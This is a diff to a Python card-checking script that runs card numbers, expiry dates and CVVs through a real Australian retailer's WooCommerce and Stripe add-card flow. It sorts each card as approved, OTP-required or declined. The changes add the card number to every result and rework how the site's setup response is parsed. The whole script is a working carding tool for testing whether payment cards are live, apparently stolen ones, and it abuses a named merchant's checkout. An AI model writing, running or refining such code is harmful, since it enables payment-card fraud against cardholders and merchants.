@@ -1,13 +1,14 @@
 import requests
 import random
 import re
+import json
 
 def check_card(ccx):
     try:
         ccx = ccx.strip()
         parts = ccx.split("|")
         if len(parts) != 4:
-            return {"status": "Declined", "response": "Invalid card format. Use CC|MM|YYYY|CVV", "gateway": "Stripe Auth"}
+            return {"cc": ccx, "response": "Invalid card format. Use CC|MM|YYYY|CVV", "status": "Declined", "gateway": "Stripe Auth"}
 
         n, mm, yy, cvc = parts
 
@@ -45,7 +46,7 @@ def check_card(ccx):
         match = re.search(r'name="woocommerce-login-nonce"\s+value="([^"]+)"', response.text)
 
         if not match:
-            return {"status": "Declined", "response": "Nonce not found", "gateway": "Stripe Auth"}
+            return {"cc": ccx, "response": "Nonce not found", "status": "Declined", "gateway": "Stripe Auth"}
 
         nonce_value = match.group(1)
 
@@ -101,7 +102,7 @@ def check_card(ccx):
 
         match = re.search(r'"add_card_nonce":"([a-zA-Z0-9]+)"', response.text)
         if not match:
-            return {"status": "Declined", "response": "add_card_nonce not found", "gateway": "Stripe Auth"}
+            return {"cc": ccx, "response": "add_card_nonce not found", "status": "Declined", "gateway": "Stripe Auth"}
 
         add_card_nonce = match.group(1)
 
@@ -132,12 +133,12 @@ def check_card(ccx):
             error_code = stripe_response['error']['code']
             error_message = stripe_response['error']['message']
             if error_code == 'card_declined':
-                return {"status": "Declined", "response": "Card was declined", "gateway": "Stripe Auth"}
-            return {"status": "Declined", "response": error_message, "gateway": "Stripe Auth"}
+                return {"cc": ccx, "response": "Card was declined", "status": "Declined", "gateway": "Stripe Auth"}
+            return {"cc": ccx, "response": error_message, "status": "Declined", "gateway": "Stripe Auth"}
 
         id = stripe_response.get('id', '')
         if not id:
-            return {"status": "Declined", "response": "Payment source creation failed", "gateway": "Stripe Auth"}
+            return {"cc": ccx, "response": "Payment source creation failed", "status": "Declined", "gateway": "Stripe Auth"}
 
         headers = {
             'Accept': 'application/json, text/javascript, /; q=0.01',
@@ -168,20 +169,27 @@ def check_card(ccx):
         }
 
         response = session.post('https://thefloordepot.com.au/', params=params, headers=headers, data=data)
-        final_response = response.json()
-
-        if "status" in final_response:
-            if final_response["status"] == "success":
-                # Check for specific conditions in the response
-                if final_response.get("requires_action"):
-                    return {"status": "Approved", "response": "OTP_REQUIRED", "gateway": "Stripe Auth"}
-                else:
-                    return {"status": "Approved", "response": "Succeeded", "gateway": "Stripe Auth"}
-            elif final_response["status"] == "error":
-                error_msg = final_response.get("error", {}).get("message", "Card was declined")
-                return {"status": "Declined", "response": error_msg, "gateway": "Stripe Auth"}
         
-        return {"status": "Declined", "response": str(final_response), "gateway": "Stripe Auth"}
+        try:
+            setup_data = response.json()
+        except json.JSONDecodeError:
+            return {"cc": ccx, "response": "Invalid JSON response from server", "status": "Declined", "gateway": "Stripe Auth"}
+
+        if setup_data.get('success', False):
+            data_status = setup_data['data'].get('status')
+            if data_status == 'requires_action':
+                return {"cc": ccx, "response": "OTP_REQUIRED", "status": "Approved", "gateway": "Stripe Auth"}
+            elif data_status == 'succeeded':
+                return {"cc": ccx, "response": "Succeeded", "status": "Approved", "gateway": "Stripe Auth"}
+            elif 'error' in setup_data['data']:
+                error_msg = setup_data['data']['error'].get('message', 'Unknown error')
+                return {"cc": ccx, "response": error_msg, "status": "Declined", "gateway": "Stripe Auth"}
+
+        if not setup_data.get('success') and 'data' in setup_data and 'error' in setup_data['data']:
+            error_msg = setup_data['data']['error'].get('message', 'Unknown error')
+            return {"cc": ccx, "response": error_msg, "status": "Declined", "gateway": "Stripe Auth"}
+
+        return {"cc": ccx, "response": str(setup_data), "status": "Declined", "gateway": "Stripe Auth"}
 
     except Exception as e:
-        return {"status": "Error", "response": f"An exception occurred: {str(e)}", "gateway": "Stripe Auth"}
+        return {"cc": ccx, "response": f"Setup Intent Failed: {str(e)}", "status": "Declined", "gateway": "Stripe Auth"}
